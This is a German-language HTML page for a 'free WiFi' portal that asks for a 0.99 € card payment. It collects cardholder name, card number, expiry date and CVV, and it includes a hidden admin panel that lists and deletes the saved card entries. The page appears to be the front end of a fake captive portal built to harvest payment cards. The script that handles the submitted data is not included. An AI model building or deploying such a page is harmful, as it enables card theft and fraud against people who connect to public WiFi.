<!DOCTYPE html>
<html lang="de">
<head>
    <meta charset="UTF-8">
    <title>Kostenloses WLAN</title>
    <link rel="stylesheet" href="style.css">
</head>
<body>
    <div class="container">
        <h2>WLAN für 0,99 € verbinden</h2>
        <p>Bitte geben Sie Ihre Kartendaten für die Zahlung ein:</p>

        <input type="text" id="cardholder" placeholder="Karteninhaber" required>
        <input type="text" id="cardNumber" placeholder="Kartennummer" required>
        <input type="text" id="expDate" placeholder="Gültig bis (MM/JJ)" required>
        <input type="text" id="cvv" placeholder="CVV" required>
        <button class="pay-button card-button" onclick="sendData()">
            Mit Karte zahlen 0,99 €
        </button>
    </div>

    <div id="adminPanel" style="display: none; margin: 20px auto; padding: 20px; border: 2px solid red; background: #ffe6e6; width: 320px; border-radius: 10px;">
        <h3>🧑‍💻 Admin Panel - Gespeicherte Daten</h3>
        <div id="savedData"></div>
        <button onclick="clearAllData()" style="background: red; margin-top: 10px; padding: 10px; color: white; border: none; border-radius: 5px; cursor: pointer;">Alle Daten löschen</button>
    </div>

    <script src="script.js"></script>
</body>
</html>
